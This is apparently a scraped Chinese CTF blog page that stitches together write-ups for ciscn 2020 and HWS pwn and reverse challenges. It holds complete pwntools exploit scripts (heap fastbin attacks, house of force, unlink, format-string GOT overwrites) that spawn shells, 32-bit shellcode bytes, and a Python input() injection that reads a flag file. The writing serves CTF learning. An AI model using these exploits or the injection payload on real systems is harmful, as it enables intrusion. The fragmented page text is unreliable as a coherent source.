:io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def reg(name,motto,age): sa('name',str(name)) sa('motto',str(motto)) sla('age',str(age)) def add(idx,size): sla('&gt;&gt;','1') sla('dex',str(idx)) sla('size',str(size)) def show(idx): sla('&gt;&gt;','2') sla('dex',str(idx)) def free(idx): sla('&gt;&gt;','3') # if int(idx) &lt;=3: sla('dex',str(idx)) # if int(idx) &gt;3: # idx = def edit(idx,data): sla('&gt;&gt;','4') sla('dex',str(idx)) sa('note',str(data)) def reset(name,motto,age): sla('&gt;&gt;','5') reg(name,motto,age) name = 'a' * 0x18 motto = 'b' * 0x20 age = 0x100 reg(name,motto,age) add(0,0x58) add(1,0x68) add(2,0x68) add(3,0x100) add(4,0x18) free(3) add(5,0x68) show(5) ru('ote 5: ') libc_base = uu64(r(6)) - 0x3c4c78 info_addr('libc',libc_base) free(-1) free(-2) age = 0x1111111100000141 reset(name,' ',age) free(0) free(1) free(2) add(0,0x100) malloc_hook = 0x3c4aed + libc_base payload = 11 * p64(0) + p64(0x71) + p64(malloc_hook) edit(0,payload) add(1,0x68) add(2,0x68) add(3,0x68) one = 0xf0364 + libc_base payload = (0x13-8) * '1' + p64(0) + p64(one) edit(3,payload) free(3) itr() 还有一种思路，就是因为bss段的age，free（-3）也可以进行free的，控制其为一个0x68堆块地址的话，就可以出现一个0x70的fastbin块，然后其size是不会北抹除的，所以利用uaf直接edit其fd为malloc hook，fastbin attack 攻击即可。 另一种打法addnote()puts(\"Input note size: \"); __isoc99_scanf(\"%lld\", &amp;size); if ( (signed __int64)size &lt;= 0x100 ) &#123; 这里有个遗漏点，add的size是可以输入负的 house of force使用条件比赛时没有想到，因为house of force相关的有点遗忘了。 可以溢出到top chunk的 size，篡改 size 为一个很大值,就可以轻松的通过top chunk的相关验证，常见就是修改为 -1 可以申请任意size的堆块，正负都行，但是有不同的攻击限制 这题是可以满足的: 利用strcpy来溢出age的数值 ，很简单的控制top chunk的 size 可以申请负的堆块，负的堆块可以打heap 或者 got ，获取一个任意地址写,通常应该都是打heap 攻击思路 修改top chunk的size 利用house of force，将top chunk向前移动，使得其与现有的chunk重合 然后通过malloc一个小堆块，构造好 fake chunk，控制现有堆的size和prev_size后_ 做unlink，实现任意地址读写。 exp#coding:utf8 from pwn import * sh = process('./babynotes') # sh = remote('123.56.170.202',43121) elf = ELF('./babynotes') libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') free_got = elf.got['free'] def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(sh) pause() context.terminal = ['tmux','neww'] sh.sendafter('Input your name:','haivk') sh.sendafter('Input your motto:','pwnit') sh.sendlineafter('Input your age:','1') def add(index,size): sh.sendlineafter('&gt;&gt;','1') sh.sendlineafter('Input index:',str(index)) sh.sendlineafter('Input note size:',str(size)) def show(index): sh.sendlineafter('&gt;&gt;','2') sh.sendlineafter('Input index:',str(index)) def delete(index): sh.sendlineafter('&gt;&gt;','3') sh.sendlineafter('Input index:',str(index)) def edit(index,content): sh.sendlineafter('&gt;&gt;','4') sh.sendlineafter('Input index:',str(index)) sh.sendafter('Input your note:',content) def reset(): sh.sendlineafter('&gt;&gt;','5') add(0,0x100) add(1,0x100) add(2,0x100) reset() sh.sendafter('Input your name:','haivk'.ljust(0x18,'a')) sh.sendafter('Input your motto:','pwnit') sh.sendlineafter('Input your age:','-1') add(4,-0x370) add(3,0x20) #top chunk上移 edit(3,p64(0x100) + p64(0x110)) heap0_ptr_addr = 0x6020E0 edit(0,p64(0) + p64(0x101) + p64(heap0_ptr_addr - 0x18) + p64(heap0_ptr_addr - 0x10)) debug() #unlink delete(1) debug() edit(0,p64(0)*3 + p64(free_got)) show(0) sh.recvuntil('Note 0: ') free_addr = u64(sh.recv(6).ljust(8,'\\x00')) libc_base = free_addr - libc.sym['free'] system_addr = libc_base + libc.sym['system'] edit(0,p64(system_addr)) edit(2,'/bin/sh\\x00') #getshell delete(2) sh.interactive() exp 来自 haivk 大师傅。 oldschool分析给了源码，分析程序带来了很大的便利。会发现很多地方对size大小验证不是很多，是负数也行，但是对此题的攻击，用途并不大。 g_ptr = mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 这里可以看到申请的mmap区，是可以进行执行的，可以考虑一下shellcode。 漏洞点void mmap_edit()&#123; if(g_ptr == NULL)&#123; printf(\"Mmap first!\"); return; &#125; unsigned value; unsigned idx; printf(\"Index: \"); idx = get_int(); if(g_ptr + idx &lt; g_ptr &amp;&amp; (unsigned)(g_ptr + idx) &lt; ADDR_HIGH)&#123; puts(\"Invalid idx\"); return; &#125; printf(\"Value: \"); value = get_int(); g_ptr[idx] = value; &#125; 可以看到其对g_ptr + idx的验证是很简单的，给足大的偏移，可以改到libc的。是一个数组溢出。 攻击思路思路1: 先正常分配，泄漏出libc地址 分配一下mmap，利用数组溢出，进行修改malloc_hook，为mmap的地址。 在mmap的内存上填上shellcode 思路2: 先正常分配，泄漏出libc地址 分配一下mmap，利用数组溢出，进行修改free_hook，为system。 free 一个 带有/bin/sh的chunk即可 这个更好点。 expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size): sla('ice','1') sla('dex',str(idx)) sla('ize',str(size)) def edit(idx,data): sla('ice','2') sla('dex',str(idx)) sa('tent',str(data)) def show(idx): sla('ice','3') sla('dex',str(idx)) def free(idx): sla('ice','4') sla('dex',str(idx)) def mmap_add(addr): sla('ice','6') sla('start',str(addr)) def mmap_edit(idx,data): sla('ice','7') sla('dex',str(idx)) sla('lue',str(data)) for i in range(8): add(i,0x90) add(9,0x10) for i in range(7): free(i) free(7) add(10,0x10) show(10) ru('ent: ') libc_base = uu32(r(4)) - 0x1d8828 info_addr('libc',libc_base) system = 0x3d200 + libc_base free_hook = 0x1d98d0 + libc_base mmap_add(0) ''' # one way offset = ((libc_base+0x1d8788 - 0xe0000000)) / 4 mmap_edit(offset,'3758096384') shellcode = '\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80' shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)] for i in range(len(shellcode)): mmap_edit(i,shellcode[i]) add(13,0x10) ''' # two way offset = ((free_hook - 0xe0000000)) / 4 mmap_edit(offset,int(system)) edit(9,'/bin/sh\\x00' + '\\n') free(9) itr() direct分析add函数 申请的chunk最大值为0x100,max为16个 size可以为负值 edit函数 offset, size 都可以为负值 read(0, (void *)(heaplist[idx] + offset), nbytes); 这里存在负溢出，可以修改上一个chunk里面的值 open file函数 只能调用一次，调用后可以进行edit chunk close 函数result = (ssize_t)readdir(dirp); v1 = result; if ( result ) &#123; put(\"Filename: \"); result = put2(v1 + 0x13); 进行打印文件名。 可以看到漏洞点就是在edit那里，且没有show函数。leak libc是此题的难点。因为是没有puts函数进行输出，所以攻击stdout也没有用。 重点是了解opendir 和 readdir。参考链接：https://blog.csdn.net/cainiao000001/article/details/80988738 可以发现，在调用opendir和readdir后，文件名是存在于内存中的。然后因为程序的写法，会直接输出一下.的文件名，再次调用会输出..的文件名，也是0x13的偏移处。那么想办法溢出修改这附近的内存，在打印文件名的时候，把libc地址也给印出来。 攻击思路 先申请8个堆，然后释放完，让其存在一个在unsortbin的chunk，且留出一个准备上溢出攻击的chunk openfile一下，在heap上申请一个巨大的chunk 上溢出攻击，把加入unsortbin的chunk的size给修改大一点,覆盖到上面那个巨大的chunk，且这个巨大堆的next chunk的prev size 要填上合适的大小，绕过对unsortbin 的检查。 close一下，会在刚刚巨大的chunk中留下dirent结构体，其中会包含filename 申请堆到..这个文件名的附近，因为是unsortbin，会在其下面留下libc地址，准备泄漏（这个要注意，尽量不要破坏dirent结构体的数据，破坏后容易无法输出filename） 上溢攻击..的文件名，给其修改其他合适的名字，泄漏出libc地址 剩下的就简单了，上溢攻击tcache chain，修改为free hook 攻击free hook 为one gadget expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size): sla('ice','1') sla('dex',str(idx)) sla('ize',str(size)) def edit(idx,offset,size,data): sla('ice','2') sla('dex',str(idx)) sla('set',str(offset)) sla('ize',str(size)) sa('tent',str(data)) def free(idx): sla('ice','3') sla('dex',str(idx)) def openfile(): sla('ice','4') def closefile(): sla('ice','5') for i in range(8): add(i,0x100) add(8,0x18) for i in range(7): free(i) openfile() add(9,0x18) add(0,0x18) free(7) data = p64(0) + p64(0x8040 + 0x20 + 0x110) edit(8,-0x120,0x100,data) data = p64(0x8170) + p64(0x20) edit(0,-0x30,0x18,data) closefile() add(1,0x90) add(2,0x70) add(3,0x60) data = p64(0x121111111111)[:6] print(data) edit(0,-0x7fd8-0x30+2,0x8,data) closefile() ru('\\x12') libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc_base',libc_base) data = p64(0x000000000000)[:6] edit(0,-0x7fd8-0x30+2,0x8,data) free_hook = 0x3ed8e8 + libc_base one = 0x4f322 + libc_base data = '1' * 8 edit(0,-0x82a0,8,p64(free_hook)) add(4,0x100) add(5,0x100) edit(5,0,8,p64(one)) free(4) # debug() itr()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"ciscn 2020初赛部分题目","slug":"ciscn 2020初赛部分题目","date":"2020-08-20T15:03:02.238Z","updated":"2020-09-24T02:19:08.778Z","comments":true,"path":"2020/08/20/ciscn 2020初赛部分题目/","link":"","permalink":"http://chumen77.xyz/2020/08/20/ciscn 2020初赛部分题目/","excerpt":"","text":"ciscn 2020初赛部分题目rez3￼看起来像是非齐次线性方程，那就是就是一个解方程: from numpy import * import numpy as np a = np.array([[12, 53, 6,34,58,36,1], [83,85,12,73,27,96,52], [78,53,24,36,86,25,46], [39,78,52,9,62,37,84], [23,6,14,74,48,12,83], [27,85,92,42,48,15,72], [4,6,3,67,0,26,68]]) b = np.array([[20247],[40182],[36315],[36518],[26921],[39185],[16546]]) result=[] x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[12094],[25270],[19330],[18540],[16386],[21207],[11759]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[10460],[25613],[21135],[24891],[18305],[27415],[12855]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[10899],[24927],[20670],[22926],[18006],[23345],[12602]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[12304],[26622],[19807],[22747],[14233],[24736],[10064]]) x = np.linalg.solve(a, b) result += x.tolist() b = np.array([[14169],[35155],[28962],[33273],[21796],[35185],[14877]]) x = np.linalg.solve(a, b) result += x.tolist() flag='' for i in result: for f in i: flag+=chr(int(f+0.5)) print(flag) hyperthreading方法一主程序很简单，要求输入42位的flag。 Handles = CreateThread(0, 0, StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, loc_401200, 0, 0, 0); CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0); WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF); 这里开始开多线程。 void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter) &#123; while ( !IsDebuggerPresent() ) ; puts((int)\"debug!\\n\"); exit(0); &#125; 这里面分别有一个反调试。用的IsDebuggerPresent。￼￼￼￼￼￼￼￼还有对你输入的东西进行处理，处理完以后与 402150 key db 0DDh,5Bh,9Eh,1Dh,20h,9Eh,90h,91h,2 dup(90h),91h .rdata:00402150 ; DATA XREF: main1+96↑r .rdata:00402150 db 92h,0DEh,8Bh,11h,0D1h,1Eh,9Eh,8Bh,51h,11h .rdata:00402150 db 50h,51h,8Bh,9Eh,2 dup(5Dh),11h,8Bh,90h,12h,91h .rdata:00402150 db 50h,12h,0D2h,91h,92h,1Eh,9Eh,90h,0D2h,9Fh 这42个数据进行对比。 那么思路就是过了反调试，定位关键处理输入的代码处，进行确定其是怎么操作数据的，但是看了一会没有找到，就开始想办法寻找字符映射来碰撞flag。 1 &gt; 0x92 2 &gt; 0xd2 3 &gt; 0x12 4 &gt; 0x51 5 &gt; 0x91 6 &gt; 0xd1 7 &gt; 0x11 8 &gt; 0x50 9&gt; 0x90 0 &gt; 0x52 a &gt; 0x9e c &gt; 0x1e d &gt; 0x5d s &gt; 0x22 - &gt; 0x8b f &gt; 0xdd l &gt; 0x5b a &gt; 0x9e g &gt; 0x1d key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F] 然后进行一位位替换，获得flag： flag&#123;a959951b-76ca-4784-add7-93583251ca92&#125; 主程序很简单，要求输入42位的flag。 Handles = CreateThread(0, 0, StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, loc_401200, 0, 0, 0); CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0); WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF); 开始新的线程： void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter) &#123; while ( !IsDebuggerPresent() ) ; puts((int)\"debug!\\n\"); exit(0); &#125; 这有一个反调试。用的IsDebuggerPresent，过的办法很简单，在x64dbg中在进入IsDebuggerPresent时，输入dbh，隐藏调试器即可。 测试在这里dbh即可。￼￼￼￼￼￼￼￼还有对你的input进行处理，处理完以后与 这42个数据进行对比。 先过了反调试，定位关键处理输入的代码处（0x401223），进行确定其是怎么操作数据的，看了一会发现没有如此简单，但是发现你输入特定字符，经过程序处理出来的都是一样的: 随意输入flag{==2332311111111111111111122222222211} 可以打印字符不算多，这就可以可以建立一个映射表：输入flag{1234567890qwertyuiopasdfghjkbnmmmmmm} 处理完：获取映射表： 1 &gt; 0x92 2 &gt; 0xd2 3 &gt; 0x12 4 &gt; 0x51 5 &gt; 0x91 6 &gt; 0xd1 7 &gt; 0x11 8 &gt; 0x50 9&gt; 0x90 0 &gt; 0x52 f &gt; 0xdd l &gt; 0x5b a &gt; 0x9e g &gt; 0x1d a &gt; 0x9e c &gt; 0x1e d &gt; 0x5d s &gt; 0x22 - &gt; 0x8b 提取一下key： key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F] 然后进行一位位替换，获得flag： flag&#123;a959951b-76ca-4784-add7-93583251ca92&#125; 方法二可以确定一下ida无法识别的数据段，是被花指令处理过了。这里开始往下识别异常，在动态调试后，提取一下正确的汇编代码，根据正确的算法进行patch掉花指令。（还是注意dbh隐藏一下调试器。） void __stdcall __noreturn sub_401120(LPVOID lpThreadParameter) &#123; int v1; // ebx CreateThread(0, 0, hHandle, 0, 0, 0); WaitForSingleObject(hHandle, 0xFFFFFFFF); inputs[0] = (inputs[0] &lt;&lt; 6) ^ ((signed int)(unsigned __int8)inputs[0] &gt;&gt; 2); inputs[0] ^= 0x23u; Sleep(6u); v1 = *(unsigned __int8 *)(__readfsdword(0x30u) + 2); inputs[0] += 0x23; JUMPOUT(loc_4011EC); &#125; Patch 后的，勉强可以看懂。其中肯定是inputs[i]进行处理的，其中也有一个地方在加1。 key = [ 0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F ] flag = '' for i in range(len(key)): key[i] -= 0x23 key[i] &amp;= 0xff #有可能运算后会小于0的，所以给处理一下 key[i] ^= 0x23 key[i] = ((key[i] &gt;&gt; 6) ^ (key[i] &lt;&lt; 2)) &amp; 0xff flag += chr(key[i]) print(flag) pwneasybox分析ubuntu 16，off by one，没有show函数，需要攻击stdout泄漏libc地址。 利用 用off by one，构造出chunk overlapping ,并且想办法释放堆块，让main_arena_落在fastbin中 修改这个main_arena_的最后2个字节，让其指向stdout附近带有0x7f的地址（属于0x70的fastbin堆块） 使用chunk overlapping ，来修改空闲的fastbin chain，使其中一个指向这个带有main_arena的堆块，进行fastbin attack，修改到stdout处的内容，leak libc 重复以上的步骤，构造一个堆块到malloc_hook处，写上one gadget 即可。 expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('101.200.53.148',34521) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def alloca(idx,size,data): sla(\"&gt;\",'1') sla('idx',str(idx)) sla('len',str(size)) sa('content',str(data)) def free(idx): sla('&gt;&gt;&gt;','2') sla('idx',str(idx)) # def pwn(): def leak_addr(): alloca(0,1,'aa') alloca(1,0x4f0,'\\xdd\\xd5') alloca(2,0xb0,'aa') alloca(3,0x60,'aa') free(0) alloca(0,0x18,'/bin/sh\\x00'*2 + p64(0) + '\\xc1') free(1) alloca(1,0x60,'\\xdd\\xd5') alloca(4,0x60,'\\x50\\x47') alloca(5,0x60,'\\x50\\x47') alloca(6,0x60,'\\x50\\x47') alloca(7,0x30,'aa') alloca(8,0x160,'aaaaaa') alloca(9,0x60,'aa') alloca(10,0x30,'aa') free(7) alloca(0,0x38, p64(0) * 7 + '\\xe1') free(8) free(4) free(9) free(5) payload = 'a' * 0x160 alloca(11,0x180,payload) payload = 'a' * 0x160 + p64(0) + p64(0x71) + '\\x20' alloca(11,0x180,payload) alloca(12,0x60,' ') # debug() alloca(13,0x60,' ') alloca(14,0x60,'\\xed\\xca') payload = 'a' * 3 + p64(0) * 6 + p64(0xfbad3c80)+p64(0)*3+p8(0) alloca(15,0x60,payload) # leak_addr() leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() io = process('./pwn') # io = remote('101.200.53.148',34521) continue info_addr('leak',leak) libc_base = leak - 0x3c56a3 info_addr('libc_base',libc_base) rec = 0xf1207 + libc_base def getshell(): alloca(7,0x60,' ') alloca(8,0x60,' ') free(0) free(11) free(6) alloca(5,0x60,' ') alloca(4,0x60,' ') alloca(0,0x60,'\\xed\\xca') free(4) free(13) free(12) payload = 'a' * 0x80 + p64(0) + p64(0x71) + '\\x90' alloca(13,0x90,payload) alloca(11,0x60,'\\x20\\xd0') alloca(6,0x60,'\\x20\\xd0') alloca(4,0x60,'\\x20\\xd0') payload = 'a' * 3 + p64(0) * 2 + p64(rec) alloca(5,0x60,payload) # debug() sleep(0.1) # alloca(8,30,'1') getshell() itr() 深夜写的exp，估计构造堆块的思路有点混乱。🤣🤣 babyjsc比赛时没有做出来，开始以为是个webpwn，不敢去做。但是很多队伍做出来了，试着去做，看到server.py,不了解jsc，以为只能执行js代码，废了很大精力写js来读取flag，还是没有成功。tcl。 最后看wp，知道了input函数本身就是个漏洞函数，其会将stdin输入的内容当做python代码去执行（就像执行计算式一样，将其看做python代码，通过计算返回结果）。当然可以用它来执行命令，不过需要先倒入os的模块，然后执行系统命令。 __import__('os').system('cat /home/ctf/flag') 对于python，input函数漏洞，参考链接：https://blog.csdn.net/weixin_34221332/article/details/92713257 no free分析*] '/ctf/work/ciscn2020/pwn/nofree/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 可以看到保护开的还是很少的，然后no free 明显需要使用到hos of orange进行攻击了。 add函数 只能申请0-0x90大小的堆块，堆块号自定义0-2，且由于没有对已经存在的堆块号验证，可以进行无限次的申请同一个序号的堆块。 堆块地址存在于0x06020C0 + 0x100 size 跟在后面。 strdup 相当于malloc(stren(s)) edit函数 倘若输入没有存在的堆块idx，程序会直接返回 read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]); 这里由于是这样的判断，结合add的strdup 就造成了堆溢出。 攻击思路难点基本就在泄漏libc了。 利用程序的堆溢出漏洞，修改一下top chunk 申请多次0号0x90的堆块，来消耗修改后的top chunk，到达一定程度后进行hos of orange攻击，获取一个空闲的进入fastbin的堆块 利用堆溢出，在fastbin chain上加一个0x06020C0 + 0x100 ，准备进行fastbin attack，来获取一个在存放堆块地址的堆块，这样就实现了任意地址写。 修改atoi 的got 表为 printf，创造出一个格式化字符串漏洞 利用add中的atoi，完成格式化字符串漏洞的利用，泄漏出libc地址 利用格式化字符串漏洞，修改atoi 的got表为elf.plt[&#39;atoi&#39;] + 6 ，让其完成一下解析，重新构造出正常的atoi（原因：测速中发现，用edit功能输入idx后直接退出，只能让其恢复正常，再进行任意地址写） 修改atoi 的got为system的地址，然后在发送个sh ，完成system(sh) expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla(\"&gt;\",'1') sla('idx',str(idx)) sla('size',str(size)) sa('content',str(data)) def edit(idx,data): sla('&gt;','2') sla('idx',str(idx)) sa(\"content\",str(data)) payload = 'a' * 0x40 add(0,0x90,payload) payload = 'a' * 0x40 + p64(0) + p64(0xfb1) edit(0,payload) payload = 'a' * 0x90 for i in range(24): add(0,0x90,payload) payload = 'a' * 0x10 add(1,0x90,payload) payload = 'a' * 0x70 add(0,0x70,payload) payload = '\\x00' * 0x18 + p64(0x71) + p64(0x6020C0 + 0x100) edit(1,payload) payload = 0x60 * 'a' add(0,0x70,payload) add(0,0x90,payload) payload = p64(0x0000000000602058) + p64(0x90) edit(0,payload) edit(1,p64(elf.plt['printf'])) sla('&gt;&gt;','1') payload = 'aaaa%7$s' + p64(0x000000000602018) sa('idx',payload) r(4) r(4) libc_base = uu64(r(6)) - libc.sym['puts'] info_addr('libc_base',libc_base) sys = libc_base + libc.sym['system'] sla('&gt;&gt;','1') payload = 'aaaa%82c' + '%8$hhn11' + p64(0x000000000602058) sa('idx',payload) edit(1,p64(sys)) s('sh') itr()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"安恒HWS夏令营选拔赛部分题目","slug":"无标题","date":"2020-08-16T11:12:38.871Z","updated":"2020-08-17T13:55:03.167Z","comments":true,"path":"2020/08/16/无标题/","link":"","permalink":"http://chumen77.xyz/2020/08/16/无标题/","excerpt":"","text":"安恒HWS夏令营选拔赛部分题目REIOT1环境搭建参考：https://www.cnblogs.com/csnd/p/11800622.html 注意网卡那块，要对应自己虚拟机网卡的情况。 启动命令：qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append \"root=/dev/sda console=tty50\" -net nic -net tap 把虚拟机中要分析的maze文件取出来scp -r /path/maze username@servername:/path 使用ghidra进行分析fgets(buf,0x28,_stdin); len = strlen(buf); uStack68 = 0x20; if (*(char *)((int)&amp;uStack68 + len + 3) == '\\n') &#123; *(undefined *)((int)&amp;uStack68 + len + 3) = 0; len = len - 1; &#125; if (len != 0x20) &#123; eorr(); &#125; 这一段可以确定让输入的是32个字符。 void FUN_004006f0(void) &#123; int i; int j; i = 0; while (i &lt; DAT_16) &#123; j = 0; while (j &lt; 8) &#123; maze[i * 8 + j] = (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt; (7U - j &amp; 0x1f)); j = j + 1; &#125; i = i + 1; &#125; return; &#125; 可以看到迷宫是在运行时根据部分数据，来生成的。并且其中一行是8个数据，一列是16个，一共128个数据。 可以使用gdb，断点在这个函数之后，把迷宫提取出来。提取出来的都是0x1 和 0x0组成的迷宫。 进入控制走位的函数： heng = 1; shu = 0; pcStackX0 = param_1 这个地方控制说，起先起点是第1行的第2个位置。 check函数，主要是看你是不是在移动后，走到了0上，走到的话，程序就判你失败。 往下看，发现主要判断： if (cVar1 != 'U') &#123; LAB_00400ad4: if ((heng == 1) &amp;&amp; (shu == 10)) &#123; uVar3 = 1; &#125; else &#123; uVar3 = 0; &#125; 在这一段，可以确定走到第11列的第2个数字即可。 提取迷宫图并处理脚本提取data=\"AMz1nG~#--Ma7e~\" data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1] maze=[] lie=0 while lie&lt;15: hang=0 while hang&lt;8: # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f)) maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f)) hang+=1 lie+=1 print(maze) 就这迷宫，我看了好一会才能走好。🤣🤣服了自己，老以为是数据提取错了。 flag = md5&#123;DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU&#125; PWNbaby_canary_分析漏洞点 格式化字符串漏洞，可以用来泄漏。 栈溢出，只能1个gadget。 难点栈迁移只能溢出一个gadget，肯定是打栈迁移，但是跟以往的栈迁移不同的是，这一个gadget只能溢出到rbp，并不能覆盖到ret address，所以只能覆盖好rbp后，利用程序走出这个函数后，将要结束程序时的leave ret 。 但是需要注意的是因为在走过一次 leave ret时，此时的rbp已经被改了，再过程序的第二个leave ret 前，需要过一下canary的检测: [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0x0 RDX: 0x38 ('8') RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00 RDI: 0x0 RBP: 